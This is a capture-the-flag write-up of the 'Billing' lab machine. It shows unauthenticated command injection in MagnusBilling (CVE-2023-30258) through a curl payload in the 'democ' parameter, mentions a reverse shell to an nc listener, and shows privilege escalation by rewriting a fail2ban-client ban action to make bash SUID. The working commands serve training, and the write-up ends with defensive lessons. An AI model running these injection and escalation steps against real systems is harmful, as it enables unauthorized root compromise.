# Billing

**Difficulty:** Easy
**Techniques:** MagnusBilling unauth RCE (CVE-2023-30258) · `fail2ban-client` privesc

## Recon
```bash
nmap -sC -sV -Pn -oN portscan.nmap <ip>
```
```
22/tcp   open  ssh     OpenSSH 9.2p1 (Debian)
80/tcp   open  http    Apache 2.4.62  → /mbilling/ (MagnusBilling)
3306/tcp open  mysql   MariaDB
```
`robots.txt` disallows `/mbilling/`; the README confirms **MagnusBilling 7**.

## Exploitation — CVE-2023-30258 (command injection)
```bash
searchsploit magnusbilling 7     # multiple/webapps/52170.txt
```
Unauthenticated command injection in `lib/icepay/icepay.php` via the `democ`
parameter. Verified blind with a timing test:
```bash
time curl "http://<ip>/mbilling/lib/icepay/icepay.php?democ=;sleep+5;"
# real 5.06s  → command executes
```
Turned it into a reverse shell to a `nc -lvnp 4444` listener → shell as `asterisk`.

## Privilege escalation — fail2ban-client
```bash
sudo -l
#   (ALL) NOPASSWD: /usr/bin/fail2ban-client
```
fail2ban runs an **action command** when it bans an IP. We can redefine a jail's
ban action to our own command (running as root), then trigger a ban:
```bash
sudo fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK \
    actionban 'chmod +s /bin/bash'
sudo fail2ban-client set asterisk-iptables banip 1.2.3.4   # triggers the action
/bin/bash -p                                               # SUID bash → root
```
```
# id → uid=0(root)
/root/root.txt      → THM{REDACTED}
/home/magnus/user.txt → THM{REDACTED}
```

## Lessons
- Keep third-party web apps patched — an unauth RCE needs no credentials.
- `NOPASSWD` on `fail2ban-client` is root: its action commands run as root and are
  fully attacker-controlled. Restrict sudo to specific, non-abusable subcommands.
- The SUID-bash trick (`chmod +s /bin/bash` → `bash -p`) is a classic root-persist
  primitive — monitor for new SUID binaries (a honeynet/SIEM detection opportunity).
